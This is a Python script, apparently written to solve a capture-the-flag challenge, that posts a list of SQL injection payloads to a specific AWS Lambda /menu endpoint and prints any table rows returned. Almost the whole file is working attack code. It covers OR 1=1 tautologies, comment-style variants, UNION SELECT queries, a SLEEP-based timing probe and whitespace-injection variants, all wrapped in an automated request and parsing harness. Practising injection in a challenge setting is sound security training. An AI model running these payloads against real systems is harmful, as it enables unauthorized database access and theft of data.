import requests
from bs4 import BeautifulSoup
import urllib.parse
import time

def send_request(payload):
    url = "https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws/menu"
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws',
        'Referer': 'https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws/menu',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"'
    }
    
    data = {'query': payload}
    response = requests.post(url, headers=headers, data=data)
    return response

def parse_response(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    tables = soup.find_all('table')
    if not tables:
        return None
    
    results = []
    rows = tables[0].find_all('tr')[1:]  # Skip header row
    for row in rows:
        cols = row.find_all('td')
        if cols:
            results.append([col.text.strip() for col in cols])
    return results

def test_payload(payload, description=""):
    print(f"\nTesting: {description}")
    print(f"Payload: {payload}")
    try:
        response = send_request(payload)
        results = parse_response(response)
        print(f"Status: {response.status_code}")
        print("Results:")
        if results:
            for row in results:
                print(row)
        else:
            print("No results found")
        return results
    except Exception as e:
        print(f"Error: {str(e)}")
        return None

# List of payloads to test
payloads = [
    # Base tests
    ("' OR 1=1--", "Basic OR injection"),
    ("' OR '1'='1", "Alternative OR injection"),
    
    # Min-related tests (based on "Wait a min!")
    ("' OR price=MIN(price)--", "Find minimum price"),
    ("' OR price=(SELECT MIN(price) FROM menu)--", "Subquery minimum price"),
    ("' OR dish=(SELECT dish FROM menu WHERE price=MIN(price))--", "Get dish with minimum price"),
    
    # Comment variations
    ("' OR 1=1/*", "Alternative comment style 1"),
    ("' OR 1=1#", "Alternative comment style 2"),
    ("' OR 1=1;--", "Semi-colon comment"),
    
    # UNION edge cases
    ("' OR 1=1 UNION--", "Partial UNION"),
    ("' UNION SELECT MIN(price),NULL,NULL FROM menu--", "UNION with MIN"),
    
    # Case sensitivity tests
    ("' or 1=1--", "Lowercase OR"),
    ("' OR 1 = 1--", "Spaced equals"),
    
    # Sanitizer-related tests (based on challenge hint)
    ("' OR category LIKE '%sanitizer%'--", "Sanitizer category"),
    ("sanitizer", "Direct sanitizer search"),
    
    # Time-based tests
    ("' OR SLEEP(1)--", "Time-based test"),
    ("' OR /* comment */ 1=1--", "Comment injection"),
    
    # Edge case characters
    ("' OR 1=1\n--", "Newline injection"),
    ("' OR 1=1\t--", "Tab injection"),
    ("' OR 1=1\r--", "Carriage return injection"),
    
    # NULL tests
    ("' OR NULL IS NULL--", "NULL test"),
    ("' OR price IS NOT NULL--", "NOT NULL test")
]

def main():
    print("Starting SQL injection tests...")
    unique_results = set()
    
    for payload, description in payloads:
        results = test_payload(payload, description)
        if results:
            # Convert results to tuple for set storage
            results_tuple = tuple(tuple(row) for row in results)
            unique_results.add(results_tuple)
        time.sleep(1)  # Be nice to the server
    
    print("\nUnique result sets found:")
    for i, result_set in enumerate(unique_results, 1):
        print(f"\nUnique Result Set {i}:")
        for row in result_set:
            print(row)

if __name__ == "__main__":
    main()